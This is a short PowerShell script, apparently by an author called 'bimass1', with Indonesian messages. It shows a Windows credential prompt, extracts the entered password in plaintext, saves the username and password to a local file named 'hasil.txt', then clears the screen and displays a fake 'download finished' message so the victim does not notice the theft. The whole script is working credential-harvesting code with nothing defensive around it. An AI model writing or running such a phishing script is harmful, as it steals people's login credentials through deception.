clear
$user = get-credential
# copyright by bimass1 
$banner = "================> hasil <===================`n"
$username = $user.UserName+"`n"
$password = $user.GetNetworkCredential().Password
$hasil = $banner + "Username: "+$username +"Password: " + $password
$hasil | Out-File -FilePath "hasil.txt"
clear
#write-host $hasil
write-host "Download selesai"